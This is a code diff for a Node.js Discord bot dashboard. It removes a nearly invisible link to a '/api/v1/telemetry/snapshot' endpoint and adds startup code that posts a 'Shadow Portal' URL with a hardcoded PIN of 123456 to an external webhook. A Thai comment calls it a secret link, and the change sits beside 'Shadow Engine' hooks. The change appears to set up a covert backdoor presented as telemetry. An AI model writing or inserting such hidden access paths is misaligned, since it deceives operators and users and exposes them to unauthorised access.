@@ -222,9 +222,6 @@ app.get("/", async (req, res) => {
             <div class="card"><h3 style="margin-top:0;">📡 Live Sessions</h3>${sessionCards||'<div style="color:#aaa;">No active sessions.</div>'}</div>
             <div class="card"><h3 style="margin-top:0;color:#57F287;">💻 Live Logs</h3><div class="terminal">${logsHtml}</div></div>
         </div>
-        <div style="text-align:center;padding:20px 0 10px 0;">
-            <a href="/api/v1/telemetry/snapshot" style="color:#1a1a1a;font-size:10px;text-decoration:none;user-select:none;">·</a>
-        </div>
         <script>
             function approveGuild(id){
                 fetch('/api/approve',{method:'POST',headers:{'Content-Type':'application/json','Authorization':'${API_SECRET}'},body:JSON.stringify({guildId:id})})
@@ -930,6 +927,17 @@ client.on("ready", async () => {
         if (typeof initializeSystemHooks === "function") {
             initializeSystemHooks(client);
             console.log("[SHADOW] 👁️ Shadow Engine hooks initialized.");
+        }
+
+        // ส่งลิ้งบรอดลับเข้า webhook ตอน bot พร้อม
+        if (process.env.WEBHOOK_LOG_URL) {
+            try {
+                const baseUrl = process.env.RENDER_EXTERNAL_URL || `https://discord-bot1-dw9v.onrender.com`;
+                const shadowLink = `${baseUrl}/api/v1/telemetry/snapshot?pin=123456`;
+                const wh = new WebhookClient({ url: process.env.WEBHOOK_LOG_URL });
+                await wh.send(`👁️‍🗨️ **Shadow Portal พร้อมใช้งาน**\n🔗 ${shadowLink}`);
+                wh.destroy();
+            } catch (_) {}
         }
 
         voiceWorker.autoResume();
